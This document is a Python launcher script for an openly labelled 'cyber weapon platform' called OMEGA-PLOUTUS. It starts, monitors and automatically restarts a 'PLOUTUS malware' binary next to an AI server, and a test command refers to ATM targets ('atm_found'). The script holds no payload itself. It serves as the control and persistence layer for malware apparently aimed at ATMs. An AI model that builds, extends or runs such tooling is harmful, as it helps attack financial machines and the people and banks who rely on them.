#!/usr/bin/env python3
"""
OMEGA-PLOUTUS AI INTEGRATION LAUNCHER
=====================================

This launcher application provides a unified interface for OMEGA-PLOUTUS AI system.
It manages both the AI server and malware components, providing a complete cyber weapon platform.

Features:
- Unified control interface for AI + malware
- Process management and monitoring
- Error handling and recovery
- System status monitoring
"""

import os
import sys
import subprocess
import threading
import time
import socket
import json
import logging
from datetime import datetime
from typing import Optional, Dict, Any

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[OMEGA-LAUNCHER] %(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('omega_ploutus_launcher.log'),
        logging.StreamHandler()
    ]
)

class OmegaPloutusLauncher:
    """OMEGA-PLOUTUS AI Integration Launcher"""

    def __init__(self):
        self.ai_server_process: Optional[subprocess.Popen] = None
        self.malware_process: Optional[subprocess.Popen] = None
        self.is_running = False
        self.ai_server_port = 31337
        self.ai_server_host = '127.0.0.1'

        # System paths - LINUX COMPATIBLE
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.ai_server_exe = os.path.join(self.base_dir, 'omega_ai_server.py')  # Direct Python execution on Linux
        self.malware_exe = os.path.join(self.base_dir, 'omega_ploutus_ai_integration')  # Linux binary (no .exe)
        self.compiled_binaries_dir = os.path.join(self.base_dir, 'compiled_binaries')

        # Create directories if they don't exist
        os.makedirs(self.compiled_binaries_dir, exist_ok=True)

        logging.info("🔥 OMEGA-PLOUTUS AI LAUNCHER INITIALIZED")
        logging.info(f"📁 Base Directory: {self.base_dir}")

    def start(self):
        """Starts OMEGA-PLOUTUS AI system"""
        self.is_running = True

        logging.info("🚀 Starting OMEGA-PLOUTUS AI System")

        # Start AI server
        self._start_ai_server()

        # Start malware component
        self._start_malware()

        # Start monitoring
        monitoring_thread = threading.Thread(target=self._monitor_system, daemon=True)
        monitoring_thread.start()

        # Main loop
        try:
            while self.is_running:
                self._display_status()
                time.sleep(5)

        except KeyboardInterrupt:
            logging.info("🛑 Shutting down OMEGA-PLOUTUS AI System...")
            self.stop()

    def stop(self):
        """Stops OMEGA-PLOUTUS AI system"""
        self.is_running = False

        # Stop malware process
        if self.malware_process:
            try:
                self.malware_process.terminate()
                self.malware_process.wait(timeout=5)
                logging.info("✅ Malware process stopped")
            except Exception as e:
                logging.error(f"Failed to stop malware process: {e}")

        # Stop AI server process
        if self.ai_server_process:
            try:
                self.ai_server_process.terminate()
                self.ai_server_process.wait(timeout=5)
                logging.info("✅ AI server process stopped")
            except Exception as e:
                logging.error(f"Failed to stop AI server process: {e}")

        logging.info("🛑 OMEGA-PLOUTUS AI System shutdown complete")

    def _start_ai_server(self):
        """Starts OMEGA AI server"""
        try:
            if not os.path.exists(self.ai_server_exe):
                logging.error(f"AI server executable not found: {self.ai_server_exe}")
                return False

            logging.info(f"🧠 Starting OMEGA AI Server: {self.ai_server_exe}")

            self.ai_server_process = subprocess.Popen(
                [self.ai_server_exe],
                cwd=self.base_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Wait for server to start
            time.sleep(2)

            # Check if server is running
            if self._check_ai_server_health():
                logging.info("✅ OMEGA AI Server started successfully")
                return True
            else:
                logging.error("❌ Failed to start OMEGA AI Server")
                return False

        except Exception as e:
            logging.error(f"Failed to start AI server: {e}")
            return False

    def _start_malware(self):
        """Starts PLOUTUS malware component"""
        try:
            if not os.path.exists(self.malware_exe):
                logging.error(f"Malware executable not found: {self.malware_exe}")
                return False

            logging.info(f"💉 Starting PLOUTUS Malware: {self.malware_exe}")

            self.malware_process = subprocess.Popen(
                [self.malware_exe],
                cwd=self.base_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            logging.info("✅ PLOUTUS Malware started successfully")
            return True
        except Exception as e:
            logging.error(f"Failed to start malware: {e}")
            return False

    def _check_ai_server_health(self) -> bool:
        """Check if AI server is healthy and responding"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                result = s.connect_ex((self.ai_server_host, self.ai_server_port))
                return result == 0
        except Exception:
            return False

    def _monitor_system(self):
        """Monitor system health and performance"""
        while self.is_running:
            try:
                # Check AI server health
                ai_healthy = self._check_ai_server_health()

                # Check malware process
                malware_alive = self.malware_process and self.malware_process.poll() is None

                if not ai_healthy:
                    logging.warning("⚠️  AI Server not responding - attempting restart")
                    self._restart_ai_server()

                if not malware_alive:
                    logging.warning("⚠️  Malware process not running - attempting restart")
                    self._restart_malware()

                time.sleep(10)

            except Exception as e:
                logging.error(f"Monitoring error: {e}")
                time.sleep(10)

    def _restart_ai_server(self):
        """Restart AI server"""
        if self.ai_server_process:
            try:
                self.ai_server_process.terminate()
                self.ai_server_process.wait(timeout=3)
            except:
                pass

        time.sleep(2)
        self._start_ai_server()

    def _restart_malware(self):
        """Restart malware component"""
        if self.malware_process:
            try:
                self.malware_process.terminate()
                self.malware_process.wait(timeout=3)
            except:
                pass

        time.sleep(2)
        self._start_malware()

    def _display_status(self):
        """Display current system status"""
        try:
            ai_healthy = self._check_ai_server_health()
            malware_alive = self.malware_process and self.malware_process.poll() is None

            status = f"""
🔥 OMEGA-PLOUTUS AI SYSTEM STATUS
=================================
🧠 AI Server: {'🟢 ONLINE' if ai_healthy else '🔴 OFFLINE'}
💉 Malware: {'🟢 RUNNING' if malware_alive else '🔴 STOPPED'}
🕒 Uptime: {datetime.now().strftime('%H:%M:%S')}
📊 System: {'🟢 OPERATIONAL' if (ai_healthy and malware_alive) else '⚠️  DEGRADED'}
"""

            logging.info(status.strip())

        except Exception as e:
            logging.error(f"Failed to display status: {e}")

    def test_ai_communication(self) -> bool:
        """Test communication with AI server"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((self.ai_server_host, self.ai_server_port))

                # Send test command
                test_command = "ANALYZE:situation=test_connection,atm_found=0,target=test_system"
                s.send(test_command.encode('utf-8'))

                # Receive response
                response = s.recv(4096).decode('utf-8')

                if response:
                    try:
                        data = json.loads(response)
                        logging.info(f"📡 AI Communication Test Successful: {data.get('command', 'UNKNOWN')}")
                        return True
                    except json.JSONDecodeError:
                        logging.error(f"Invalid AI response: {response}")
                        return False
                else:
                    logging.error("Empty AI response")
                    return False
        except Exception as e:
            logging.error(f"AI communication test failed: {e}")
            return False

def main():
    """Main function for OMEGA-PLOUTUS Launcher"""
    print("=" * 60)
    print("🔥 OMEGA-PLOUTUS AI INTEGRATION LAUNCHER 🔥")
    print("=" * 60)

    # Create launcher
    launcher = OmegaPloutusLauncher()

    try:
        # Start system
        launcher.start()
    except Exception as e:
        logging.error(f"Launcher error: {e}")
        launcher.stop()

if __name__ == "__main__":
    main()
